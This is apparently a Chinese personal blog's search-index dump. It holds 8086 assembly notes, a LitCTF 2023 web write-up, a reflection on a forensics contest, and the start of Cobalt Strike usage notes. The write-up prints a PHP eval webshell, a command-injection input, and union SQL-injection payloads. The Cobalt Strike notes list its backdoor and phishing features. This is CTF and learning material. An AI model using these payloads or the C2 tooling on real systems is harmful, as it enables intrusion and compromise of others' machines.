直到遇见“$”（“$”本身并不显示，只起到边界的作用）。\n如果字符串比较长，遇到行尾，程序会自动跳转到下一行开头处继续显示；如果到了最后一行，还能自动上卷一行。\n","slug":"07","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"1401df5d38db739612f2fd959b8dc1d1","title":"8086汇编学习笔记_08","content":"端口CPU 可以直接读写 3 个地方的数据：CPU 内部的寄存器、内存单元、端口。\n1. 端口的读写CPU 通过端口地址来定位端口。因为端口所在的芯片和 CPU 通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。PC 系统中，CPU 最多可以定位 64KB 个不同的端口。则端口地址的范围为 0~65535。\n端口的读写指令只有两条：in 和 out。分别从端口读取和写入数据。\n比较 CPU 执行内存访问指令和端口访问指令时，总线上的信息：\n\n访问内存：\n\nmov ax,ds:[8]\n假设执行前（ds）&#x3D; 0\nCPU 通过地址线将地址信息 8 发出；CPU 通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据；存储器将 8 号单元中的数据通过数据线送入CPU。\n\n访问端口：\n\nin al,60h     ;从60h端口读入一个字节\nCPU 通过地址线将地址信息 60h 发出；CPU 通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据；端口所在的芯片将 60h 端口中的数据通过数据线送入 CPU。\n注意：in 和 out 指令中，只能使用 ax 或 al 来存放从端口中读入的数据或要发送到端口中的数据。8 位端口用 al，用 16 位端口用 ax。\n对0 ~ 255以内的端口进行读写：in al,20h   ;从20h端口读入一个字节out 20h,al  ;往20h端口写入一个字节\n对256 ~ 65535的端口进行读写时，端口号放在dx中：mov dx,3f8h ;将端口号3f8送入dxin al,dx    ;从3f8h端口读入一个字节out dx,al   ;向3f8h端口写入一个字节\n2. CMOS RAM 芯片CMOS 芯片的特征：\n\n包含一个实时钟和一个有 128 个存储单元的 RAM 存储器(早期的计算机为 64 个字节)。\n该芯片靠电池供电。所以，关机后其内部的实时钟仍可正常工作，RAM 中的信息不丢失。\n128 个字节的 RAM 中，内部实时钟占用 0~0dh 单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时 BIOS 程序读取。\nBIOS 也提供了相关的程序，可以在开机时配置 CMOS RAM 中的系统信息。\n\n\n该芯片有两个端口，端口地址为 70h 和 71h。CPU 通过这两个端口来读写 CMOS RAM。\n70h 为地址端口，存放要访问的 CMOS RAM 单元的地址；71h 为数据端口，存放从选定的 CMOS RAM 单元中读取的数据，或要写入其中的数据。\n\n可见，CPU对CMOS RAM的读写分两步进行。\n3. shl和shr指令shl 和 shr 是逻辑移位指令。\n\nshl 是逻辑左移指令，它的功能是：\n\n将一个寄存器或内存单元中的数据向左移位；\n将最后移出的一位写入 CF 中；\n最低位用 0 补充。\n如果移动位数大于 1 时，必须将移动位数放在 cl 中。\n\n\nshr 是逻辑右移指令，它的功能是：\n\n将一个寄存器或内存单元中的数据向右移位；\n将最后移出的一位写入 CF 中；\n最低位用 0 补充。\n如果移动位数大于 1 时，必须将移动位数放在 cl 中。\n\n\n\n4. CMOS RAM中存储的事件信息在 CMOS RAM 中，存放着当前的时间：年、月、日、时、分、秒。这 6 个信息的长度都位 1 个字节，存放单元为：\n\n\n\n时间\n秒\n分\n时\n日\n月\n年\n\n\n\n字节\n0\n2\n4\n7\n8\n9\n\n\n这些数据以 BCD 码的方式存放。\n\n\n\n十进制数码\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\nBCD 码\n0000\n0001\n0010\n0011\n0100\n0101\n0110\n0111\n1000\n1001\n\n\n可见，一个字节可表示连个BCD码。\n则CMOS RAM存储时间信息的单元中，存储了用两个BCS码表示的两个十进制数，高4位标识的BCD码表示十位，低4位BCD码表示个位。\n外中断cpu在计算机系统中，除了能够执行命令，进行运算以外，还应该能够对外部设备进行控制，接收它们的输入，向它们进行输出。也就是说，cpu除了有运算能力外，还要有I&#x2F;O能力。\n1. 接口芯片和端口在PC系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，cpu将这些寄存器当作端口来访问。外设的输入不直接送入内存和cpu，而是送入相关的接口芯片和端口中。cpu向外设的输出也不是直接送入外设，而实先送入端口中，再由相关的芯片送到外设。\n2. 外中断信息在PC系统中，外中断源一共由两种：\n\n可屏蔽中断\n不可屏蔽中断\n\n可屏蔽中断是CPU可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF位的设置。\n当CPU 检测到可屏蔽中断信息时：\n\n如果IF&#x3D;1，则CPU 在执行完当前指令后响应中断，引发中断过程；\n如果IF&#x3D;0，则不响应可屏蔽中断。\n\n可屏蔽中断所引发的中断过程，除在第一步的是线上有所不同外，基本上和内中断的中断过程相同。\n可屏蔽中断信息来自于CPU外部，中断类型码是通过数据总线送入CPU的；而内中断的中断类型码是在CPU内部产生的。\n现在，我们可以解释中断过程中将IF置为0的原因了。将IF之0的原因就是，在进入中断处理程序后，禁止其他的可屏蔽中断。\n当然，如果在中断处理程序中需要处理可屏蔽中断，可以用指令将IF置1。\n8086CPU 提供的设置IF的指令如下：\n\nsti，用于设置IF&#x3D;1；\ncli，用于设置IF&#x3D;0。\n\n不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发终端过程。\n对于8086CPU不可屏蔽中断的中断类型码固定为2。所以中断过程中，不需要取中断类型码。\n不可屏蔽中断的中断过程：\n\n标志寄存器入栈，IF &#x3D; 0，TF &#x3D; 0；\nCS、IP 入栈；\n(IP)&#x3D;(8)，(CS)&#x3D;(0AH)。\n\n几乎所有外设引发的中断，都是可屏蔽中断。\n3. PC机键盘的处理过程键盘输入的处理过程：\n\n键盘输入\n引发9号中断\n执行int 9中断例程\n\n键盘上的每一个键相当于一个开关，键盘中有一个芯片对键盘上的每一个键的开关状态进行扫描。\n按下一个键时，开关接通，该芯片就产生一个扫描码，扫描码说明了按下的键在键盘上的位置。扫描码被送入主板上的相关接口芯片的寄存器中，该寄存器的端口地址为60H。\n松开按下的键时，也产生一个扫描码，扫描码说明了松开的键在键盘上的位置。松开按键时产生的扫描码也被送入60H端口中。\n\n\n\n\n\n\n\n\n\n一般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。\n?扫描码长度为一个字节，通码的第7位为0，断码的第7位为1，即：断码 &#x3D; 通码＋80H\n\n键盘输入到达 60h 端口时，相关芯片向 CPU 发出中断类型码为 9 的可屏蔽中断信息，CPU 检测到该中断信息后，若 IF&#x3D;1，引发中断过程，执行 int 9 中断例程。\n执行 int 9 中断例程：\n\n读出 60h 端口中的扫描码；\n如果是字符键，将该扫描码和其对应的 ACII 码送入内存中的 BIOS 缓存区；如果是控制键，则将其转变为状态字节写入内存中存储状态字节的单元。\n对键盘系统进行相关控制。\n\nBIOS键盘缓冲区可以存储15个键盘输入，因为int9中断例程除了接收扫描码外，还要产生和扫描码对应的字符码，所以在BIOS键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码。\n?0040:17 单元存储键盘状态字节，该字节记录了控制键和切换键的状态。键盘状态字节各位记录的信息如下：\n\n0：右shift状态，置1表示按下右shift键；\n1：左shift状态，置1表示按下左shift键；\n2：CTRL状态，置1表示按下CTRL键；\n3：alt状态，置1表示按下alt键；\n4：scroll lock状态，置1表示scroll 指示灯亮；\n5：NumLock状态，置1表示小键盘输入的是数字；\n6：CapsLock状态，置1表示输入大写字母；\n7：insert状态，置1表示处于删除态；\n\n4. 编写int 9中断例程略。\n5. 安装新的int 9中断例程略。\n直接定址表1. 描述了单元长度的标号在代码段中使用标号 code、a、b、start、s 等来标记指令、数据、段的起始地址。\n这些标号仅仅表示了内存单元的地址。\nassume cs:code\ncode segment\n    a: db 1,2,3.4,5,6,7,8\n    b: dw 0\nstart: mov si,offset a\n       mov bx,offest b\n       mov cx,8\n    s: mov al,cs:[si]\n       mov ah,0\n       add cs:[bx],ax\n       inc si\n       loop s\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n还可以使用一种标号，标号后面没有 “:”，这种标号不但表示内存单元的地址，还表示了内存单元的长度，即表示在此标号处的单元，是一个字节单元、还是子单元，还是双字单元。\nassume cs:code\ncode segment\n    a db 1,2,3.4,5,6,7,8\n    b dw 0\nstart: mov si,0\n       mov cx,8\n    s: mov al,a[si]\n       mov ah,0\n       add b,ax\n       inc si\n       loop s\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n因为这种标号包含了对于单元长度的描述，所以在指令中，它可以代表一个段中的内存单元。\n比如，对于程序中的 “b dw 0”：\n\nmov ax,b  相当于 mov ax,cs:[8]\nmov b,2   相当于 mov word ptr cs:[8],2\ninc b     相当于 inc word ptr cs:[8]\n\n这些指令中，标号 b 代表了一个内存单元，地址为 code:8，长度为两个字节。\n\n使用这种包含单元长度的标号，可以使我们以简洁的形式访问内存中的数据。\n这种标号称为数据标号，标记了存储数据的单元的地址和长度。\n不同于仅仅表示地址的地址标号。\n\n2. 在其他段中使用数据标号一般来说，不在代码段中定义数据，而是将数据定义到其他段中。\n在其他段中，我们也可以使用数据标号来描述存储数据的单元的地址和长度。\n注意：在后面加有 “：” 的地址标号，只能在代码段中使用，不能在其他段中使用。\n如果想在代码段中直接使用数据标号访问数据，则需要使用伪指令 assume 将标号所在的段和一个段寄存器联系起来。\n否则编译器编译的时候，无法确定标号的段地址在哪一个寄存器中。\n当然，这种联系是编译器的工作需要，但绝不是说，我们因为编译器的工作需要，用assume指令将段寄存器和某个段相联系，段寄存器中就会真的存放该段的地址。\n我们可以将标号当作数据来定义，此时，编译器将标号所表示的地址当作数据的值。\n\n比如：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw a,bdata ends\n\n数据标号c处存储的两个字型数据为标号a、b的偏移地址。\n\n相当于：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw offset a,offset bdata ends\n\n再比如：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dd a,bdata ends\n\n\n数据标号c处存储的两个双字型数据为标号a的偏移地址和段地址、标号b的偏移地址和段地址。\n\n相当于：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw offset a,seg a,offset b,seg bdata ends\n\nseg操作符，功能为取得某一标号的段地址。\n3. 直接定址表用查表的方法编写相关程序的技巧：\n编写子程序，以十六进制的形式在屏幕中显示给定的字节型数据。\n分析:\n\n一个字节需要用两个十六进制数码来表示，所以需要在屏幕上显示两个ASCII字符\n\n数值0~9和字符”0“ ~ ”9“之间的映射关系:数值+30h&#x3D;对于字符的ASCII值\n\n数值10~15和字符”A“ ~ ”F“之间的映射关系:数值+37h&#x3D;对于字符的ASCII值\n\n可以利用数值和字符之间的这种原本存在的映射关系，通过高4位和低4位值得到对应的字符码\n\n\n但是由于映射关系不同，我们在程序中不许进行一些比较，对于大于9的数值，我们要用不同的计算方法。我们希望用更简捷的算法，就要考虑用同一种映射关系从数值得到字符码。\n具体的做法是，我们建立一张表，表中依次存储字符”0” ~ ”F”,我们可以通过数值0~15直接查找对应的字符\n可以在直接定址表中存储子程序的地址，方便地实现不同子程序的调用。\n子程序如下：\n;用 al 传送要显示的数据\nshowbyte:   jmp short show\n            show db &#39;0123456789ABCDEF&#39;    ;字符表\n    show:    push bx\n            push es\n\n            mov ah,al\n            shr ah,1\n            shr ah,1            \n            shr ah,1            \n            shr ah,1                ;右移 4 位，ah 中得到高 4 位的值\n            and al,00001111b         ;al 中为低 4 位的值\n\n            mov bl,ah\n            mov bh,0\n            mov ah,table[bx]         ;用高 4 位的值作为相对于 table 的偏移，取得对应的字符\n\n            mov bx,0b800h\n             mov es,bx\n             mov es:[160*12+40*2],ah \n\n             mov bl,al\n             mov bh,0\n             mov al,table[bx]        ;用低 4 位的值作为相对于 table 的偏移，取得对应的字符\n\n            mov es:[160*12+40*2+2],al\n\n            pop es\n            pop bx\n\n            ret\n\n子程序中，在数值 0~15 中和字符 “0” ~ “F” 之间建立的映射关系位：以数值 N 为 table 表中的偏移，可以找到对应的字符。\n利用查表的方式的目的一般来说有三个：（1）为了算法的清晰和简洁；（2）为了加快运算速度；（3）为了使程序易于扩充。\n4。 程序入口地址的直接定址表可以在直接定址表中存储子程序的地址，方便实现不同子程序的调用。\n实现一个子程序setscreen，为显示输出提供如下功能：\n\n清屏，\n设置前景色，\n设置背景色，\n向上滚动一行\n\n入口参数:（1）用ah传递功能号：\n\n0 表示清屏\n1 表示设置前景色\n2 表示设置背景色\n3表示向上滚动一行\n\n（2）对于2，3号功能，用al传递颜色值 (al)属于{0，1，2，3，4，5，6，7}\n功能实现：\n\n清屏：\n将显存中当前屏幕中的字符设为空格符；\n\n\n设置前景色：\n设置显存中当前屏幕中处于奇地址的属性字节的第0，1，2位；\n\n\n设置背景色：\n设置显存中当前屏幕中处于奇地址的属性字节的第4，5，6位；\n\n\n向上滚动一行:\n依次将n+1行的内容复制到第n行处，最后一行为空；\n\n\n\n&#x2F;&#x2F; 功能子程序1：清屏\nsub1:   push bx\n        push cx\n        push es\n        mov bx,0b800h\n        mov es,bx\n        mov bx,0\n        mov cx,2000\nsub1s:  mov byte ptr es:[bx],&#39; &#39;\n        add bx,2\n        loop subls\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序2：设置前景色\nsub2:   push bx\n        push cx\n        push es\n\n        mov bx,0b800h\n        mov es,bx\n        mov bx,1\n        mov cx,2000\nsub2s:  and byte ptr es:[bx],11111000b\n        or es:[bx],al\n        add bx,2\n        loop sub2s\n\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序3：设置背景色\nsub3:   push bx\n        push cx\n        push es\n        mov cl,4\n        shl al,cl\n        mov bx,0b800h\n        mov es,bx\n        mov bx,1\n        mov bx,2000\nsub3s:  and byte ptr es:[bx],10001111b\n        or es:[bx],al\n        add bx,2\n        loop sub3s\n\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序4：向上滚动一行\nsub4:   push cx\n        push si\n        push di\n        push es\n        push ds\n\n        mov si,0b800h\n        mov es,si\n        mov ds,si\n        mov si,160                  ;ds:si指向第n+1行\n        mov di,0                    ;es:di指向第n行\n        cld\n        mov cx,24                   ;共复制24行\nsub4s:  push cx\n        mov cx,160\n        rep movsb                   ;复制\n        pop cx\n        loop sub4s\n\n        mov cx,80\n        mov si,0\nsub4s1: mov byte ptr [160*24+si],&#39; &#39;    ;最后一行清空\n        add si,2\n        loop sub4s1\n\n        pop ds\n        pop es\n        pop di\n        pop si\n        pop cx\n        ret\n\n可以将这些功能子程序的入口地址存储在一个表中，它们在表中的位置和功能号相对应。\n对应的映射关系:功能号*2&#x3D;对应的功能子程序在地址表中的偏移\nsetscreen:  jmp short set\n\n    table   dw sub1,sub2,sub3,sub4\n\n    set:    push bx\n\n            cmp ah,3            ;判断功能号是否大于3\n            ja sret\n            mov bl,ah\n            mov bh,0\n            add bx,bx           ;根据ah中的功能号计算对应子程序在table中的偏移\n\n            call word ptr table[bx]         ;调用对应的功能子程序\n\n    sret:   pop bx\n            iret \n\n用通过比较功能号进行转移的方法，程序结构比较混乱，不利于功能的扩充。\n用根据功能号查找地址表的方法，程序的结构清晰，便于补充。\n使用BIOS进行键盘输入和磁盘读写\n大多数的程序都需要用户的输入，键盘输入是最基本的输入。\n\n程序和数据通常需要长期存储，磁盘是最常用的存储设备。\n\nBIOS为这两种外设的I&#x2F;O提供了最基本的中断例程。\n\n\n键盘输入将引发9号中断，BIOS提供了int 9中断例程。\nCPU在9号中断发生后，执行int 9中断例程，从60h端口读出扫描码，并将其转化为相应的ASCII码或状态信息，存储在内存的指定空间（键盘缓冲区或状态字节）中。\n所以，一般的键盘输入，在CPU执行完int 9中断例程后，都放到了键盘缓冲区中。\n\n键盘缓冲区中有16个字单元，可以存储15个按键的扫描码和对应的ASCII码。高位字节是扫描码，低位字节是字符码。\n\n状态字节存放在0040:17单元。该字节记录了控制键和切换键的状态。\n\n\n1. int 9中断例程对键盘输入的处理键盘输入将引发9号中断，BIOS提供了int 9中断例程。CPU在9号中断发生后，执行9号中断例程，从60号端口读出扫描码，将其转化为相应的ASCII码或者状态信息，存储在内存的指定空间(键盘缓冲区或状态字节)中。eg:简述Shift_A(1). 按下左Shift键，引发键盘中断；int 9中断例程接受左Shift键的通码，设置0040:17处的状态字节的第1位为1，表示左Shift键按下。(2). 按下A键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出A键的通码；检测状态字节，看看是否有切换键按下，发现左Shift键被按下，则将A键的扫描码1Eh和Shift_A对应的ASCII码，即大”A”的ASCII码41h，写入键盘缓冲区。(3). 松开左Shift键，引发键盘中断；int 9中断例程接受左Shift键的断码，设置0040:17处的状态字节的第1位为0，表示左Shift键松开。\n2. 使用 int 16h中断例程读取键盘缓冲区int 16h中断例程中包含的一个最重要的功能是从键盘缓冲区中读取一个键盘输入，该功能的编号为0。\n下面的指令从键盘缓冲区中读取一个键盘输入并且将其从缓冲区中删除：mov ah, 0int 16h结果: (ah)&#x3D;扫描码，(al)&#x3D;ASCII码。\nint 16h中断例程检测键盘缓冲区，发现缓冲区空，则循环等待，直到缓冲区中有数据。\nint 16h中断例程的0号功能，进行如下工作。(1) 检测到键盘缓冲区是否有数据；(2) 没有继续做第一步；(3) 读取缓冲区第一个字单元中的键盘输入；(4) 将读取的扫描码送入ah，ASCII码送入al；(5) 将已读取得键盘输入从缓冲区中删除。\n可见，BIOS的int 9中断例程和int 16h中断例程是一堆相互配合的程序，int 9中断例程向键盘缓冲区中写入，int 16h中断例程从缓冲区中读出。\n它们写入和读出的时机不同，int 9中断例程在有键按下的时候向键盘缓冲区中写入数据；而int 16h中断例程是在应用程序对其进行调用的时候，将数据从键盘缓冲区中读出。\n3. 字符串的输入字符串的输入，用户通过键盘输入的通常不仅仅是单个字符而是字符串。我们初步的了解一下。最基本的字符串输入程序，需要具备下面的功能。\n(1) 在输入的同时需要显示这个字符串；\n(2) 一般在输入回车符后，字符串输入结束；\n(3) 能够删除已经输入的字符。\n编写一个接受字符串的输入子程序，实现上述三个基本功能。因为在输入的过程中需要显示，子程序的参数如下：\n\n（dh）、（dl）&#x3D; 字符串在屏幕上显示的行、列位置；\nds:si指向字符串的存储空间，字符串以0为结尾符。\n\n（1）字符串的输入和删除每个新输入的字符都存储在前一个输入的字符之后，而删除是从最后面的字符进行的。可以看出在字符串输入的过程中，字符的输入和输出是按照栈的访问规则进行的，即后进先出。这样，我们呢就可以用栈的方式来管理字符串的存储空间，也就是说，字符串的存储空间实际上是一个字符栈。字符栈中的所有字符，从栈底到栈顶，组成一个字符串。\n（2）在输入回车符后，字符串输入结束。输入回车符后，我们可以在字符串中加入0，表示字符串结束。\n（3）在输入的同时需要显示这个字符串。每次有新的字符输入和删除一个字符的时候，都应该重新显示字符串，即从字符栈的栈底到栈顶，显示所有的字符。\n（4）程序的处理过程。\n\n调用int 16h读取键盘输入；\n如果是字符，进入字符栈，显示字符栈中的所有字符；继续执行1；\n如果是退格键，从字符栈中弹出一个字符，显示字符栈中的所有字符；继续执行1；\n如果是Enter键，向字符栈中压入0，返回。\n\n子程序：字符栈的入栈、出栈和显示。参数说明：\n\n（ah）&#x3D; 功能号，0表示入栈，1表示出栈，2表示显示；\nds:si栈项字符栈空间\n对于0号功能：（al）&#x3D; 入栈字符；\n对于1号功能：（al）&#x3D; 返回的字符；\n对于2号功能：（dh）、（dl）&#x3D; 字符串在屏幕上显示的行、列位置。\n\n\n\n4. 应用int 13h中断例程对磁盘进行读写3.5英寸软盘分为上下两面，每面有80个磁道，每个磁道又分为18个扇区，每个扇区的大小为512个字节。\n??则：2面80磁道18扇区*512字节&#x3D;1440KB~&#x3D;1.44MB\n??磁盘的实际访问由磁盘控制器进行，我们可以通过控制磁盘控制器来访问磁盘。只能以扇区为单位对磁盘进行读写。在读写扇区的时候，要给出面号、磁道号和扇区号。面号和磁道号从0开始，而扇区号从1开始。\n??如果我们通过直接控制磁盘控制器来访问磁盘，则需要涉及许多硬件细节。BIOS提供了对扇区进行读写的中断例程，这些中断例程完成了许多复杂的和硬件相关的工作。我们可以通过调用BIOS中断例程来访问磁盘。\n??BIOS提供的访问磁盘的中断例程为int 13h。\n\n\n返回参数：\n\n操作成功：（ah）&#x3D; 0，（al）&#x3D; 写入的扇区数\n操作失败：（ah）&#x3D; 出错代码\n\n注意：直接向磁盘扇区写入数据是很危险的，很可能覆盖掉重要数据。\n","slug":"08","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"a1d695094e9aa3c3a7c4f837b1ce6fd6","title":"web[LitCTF2023] 郑州轻工业大学首届网络安全赛wp","content":"1.我Flag呢？\n2.导弹迷踪\n3.Follow me and hack me\n4.Ping前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）并将抓到的包进行我们需要的修改，”127.0.0.1|ls”，执行ls命令,可以执行,发现flag文件,直接cat，就可以读取\n5.PHP是世界上最好的语言！！题目提示flag位于根目录，直接去根目录找就行，然后直接cat就能拿到flag\n6.作业管理系统查看页面源代码，提示默认账户admin admin，登录进入作业管理系统，发现上传文件的功能，猜测存在文件上传漏洞，上传php一句话木马，\n&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;\n使用蚁剑连接，访问上传木马1.php，连接成功，发现根目录下存在flag文件，读取flag文件得到flag\n7.Vim yyds访问xxx&#x2F;.index.php.swp下载泄露的备份文件整理后的代码如下：\n&lt;?php\nerror_reporting(0);             \n$password &#x3D; &quot;Give_Me_Your_Flag&quot;;             \necho &quot;&lt;p&gt;can can need Vim &lt;&#x2F;p&gt;&quot;;             \n&#123;             \nif ($_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; base64_encode($password)) \necho &quot;&lt;p&gt;Oh You got my password!&lt;&#x2F;p&gt;&quot;;             \neval(system($_POST[&#39;cmd&#39;]));                 \n&#125;                 \n?&gt;             \n按照要求post提交password和cmd，在根目录发现flag\n8.这是什么？SQL ！注一下 ！1)))))) or 1&#x3D;1#\n\n然后,恭喜你，就得到了一个假的flag。\n1)))))) order by 2 #\n\n输入3返回值为0，\n1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#\n爆库：information_schema,mysql,ctftraining,performance_schema,test,ctf\n1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;ctftraining&quot;#\n爆表：flag,news,users\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;flag&quot;#\n爆列名：flag\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n9.Http pro max plus\n可恶，加了个xff。被嘲讽了。不过没关系，还有很多办法。\nclient-ip: 127.0.0.1\n\n\nemmm，也许还有更简单粗暴的方法，但是。\nReferer:pornhub.com\n\n\nUser-Agent: Chrome\n\n\n代理的请求头：\n\nHTTP请求头大全,HTTP头信息包括通用头、请求头、响应头和实体头四个部分：https://stackoverflow.org.cn/httpheader/\nvia: Clash.win\n\n\n\n三个链接我帮大家都看过了，没有好康的，但是拿到flag就不亏。\n\n10.1zjs\n是f1ag，不是flag，慢慢找吧，js代码有点多。然后访问&#x2F;&#102;&#x40;&#x6b;&#51;&#102;&#x31;&#97;&#103;&#x2e;&#x70;&#104;&#x70;，把代码全部复制到控制台回车。js fuck：\n11.就当无事发生社工题，给了链接 https://ProbiusOfficial.github.io ，打开后发现是探姬的博客，翻到最底下hexo，搭建过博客就想到github（唔，加上背景图片博客很好看，但是我截图的时候图片没加载出来）\n\n利用github搭建的hexo博客有固定格式：https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/\n\n历史记录有删掉的版本，不出意外就在这里面就有flag。\n\n12.Flag点击就送！flask-session-cookie-manager工具下载：https://github.com/noraj/flask-session-cookie-manager\nusage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s &lt;string&gt;, --secret-key &lt;string&gt;\n                        Secret key\n  -t &lt;string&gt;, --cookie-structure &lt;string&gt;\n                        Session cookie structure\n\n\n13.彩蛋彩蛋分布于  Follow me and hack me  作业管理系统 狠狠的注入 四个题目 中\n\n1.我Flag呢:在script.min.js可以找到。\n\nLitCTF&#123;First_t0_The_k3y! (1&#x2F;?) \n\n2.作业管理系统：\n_S0_ne3t? (2&#x2F;?)\n\n3.Follow me and hack me:\n提示说有备份文件很好吃。\n备份文件常见的后缀名:\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n常见的网站源码备份文件名：\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\nwww.zip，手动尝试吧，脚本没跑出来，全是200。\n\n_R3ady_Pl4yer_000ne_ (3&#x2F;?)\n\n4.狠狠的注入:\nF1rst_to_Th3_eggggggggg!&#125; (4&#x2F;4)\n\nall.四个合在一起得到彩蛋的完整flag：\nNSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;","slug":"Litctf 2023","date":"2023-05-16T15:45:17.000Z","categories_index":"文章","tags_index":"LitCTF,wp","author_index":"南瓜の无名"},{"id":"d183dfb007b882d9bb397f4054d5a867","title":"2023首届盘古石杯结束后的随想","content":"刚刚结束了“盘古石”杯电子取证的比赛，是一场很精彩的比赛，数字取证也许漫长而枯燥，但是对于我这种同样无趣的人来说，反而是一种乐趣。看着发光的电脑屏幕，突然有一种想哭的感觉，似乎是什么都没有改变，一切又已经截然不同。同样是题目做不出来，同样是临近收卷时的心悸，可是却已波澜不惊。我担心，这已经是一种习惯了，但是桌面留下的痕迹告诉我不是。因为报名的晚，所以是一个人参与的，理论上五个小时的话，如果很厉害的人是可以都做完的。显然，我不是很厉害的人。承认自己会失败时很重要的，但更重要的时学习如何去弥补，我想对曾经逃避不敢正视未来的自己说，你真棒，完成了第一步，然后，剩下的答案就交给当下的我去书写吧。能做出来的题都是一眼能看出来答案的题目，但是从纷乱的数据中找出线索很有成就感，可不是谁都可以连续五个小时坐在电脑前一动不动盯着屏幕的！尝试真的很重要，记得第一次护网面试的时候紧张的语无伦次，第二次就已经可以泰然处之了。如果尝试过后所获得的经验远大于面对未知的恐惧，那么少年，勇敢的向前走吧！无论是盘古石还是火眼，数字取证的工具都很好用，但是正确的使用方法也很重要，错误的使用工具大概是每一个初学者都会犯的错误，比如我。有一些题目如果晚一些交就好了，明明可以作对的，有些不该犯的错误要避免。下一次，会更好的。就像人来人往的街道一般，感觉时间过的好快，最近都有些忙不过来，放弃是很简单的一件事，可是真的放弃了，反而会怅然若失吧。嗯，是时间去做一些更有意义的事情了，我收起了电脑，我的达摩克利斯之剑，挺身站起——也许有一天，这个世界真的会因为我的改变，没有了哭声。\n","slug":"盘古石赛后感","date":"2023-05-06T07:49:36.000Z","categories_index":"无用空间","tags_index":"随想","author_index":"南瓜の无名"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-05-05T05:50:17.266Z","categories_index":"test","tags_index":"test","author_index":"南瓜の无名"},{"id":"683422935a9a4a685de276df60649fb9","title":"windows下cobaltstrike的简单使用笔记（汉化版）","content":"1.配置和启动配置teamserver，需要root权限。\n\n.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]\n&lt;host&gt; 必需参数 团队服务器IP\n&lt;password&gt; 必需参数 连接服务器的密码\n[&#x2F;path&#x2F;to&#x2F;c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性\n[YYYY-MM-DD] 可选参数 所有payload的终止时间\n\n\n汉化版是cobaltStrikeCN，里面有一个cs.bat，点击命令如下。\njava -Dfile.encoding&#x3D;UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar\n\n\n修改主机和密码为刚才设置的服务端ip和密码，端口默认50050，用户名随意，点击连接，即可进入cs图形化界面。\n2.菜单功能（中英对照）cobalt strick\n\nNew Connection       # 新建连接，允许连接多个服务器端\nPreferences           # 设置（界面、控制台样式设置等）\nVisualization       # 视图（结果输出模式） \n# Pivot Graph 枢纽试图\n# Session Table 会话列表\n# Target Table 目标列表\nVPN Interface        # VPN接口\nListeners           # 监听器（创建Listener）\nScript Manangers    # 脚本管理器\nClose              # 关闭\n\nView （视图）\n\nApplications     #显示目标机的应用信息\nCredentials      #凭证（所有通过Mimikatz抓取的密码都存储在这里）\nDownloads       #下载文件\nEvent Log        #事件日志，主机上线记录及团队交流记录\nKeystrokes      #键盘记录\nProxy Pivots    #代理模块\nScreenshots     #查看目标机截图\nScript Console  #脚本控制台\nTargets          #显示目标主机\nWeb Log         #Web日志\n\nAttacks（攻击）\n\nPackages    # 生成后门\n    -- HTML Aplications   # 网页后门\n    -- MS Office MAcro    #office宏后门\n    -- Payload Generator  #生成各种编程语言的后门\n    -- Windows Executable #可执行的exe文件\n    -- Windows Executable(s) #生成无状态的可执行exe文件\nWeb Drive—by   #钓鱼攻击\n    -- Mange  管理器\n    -- Clone Site  ##克隆网站，可以记录受害者提交的数据；\n    -- Host file 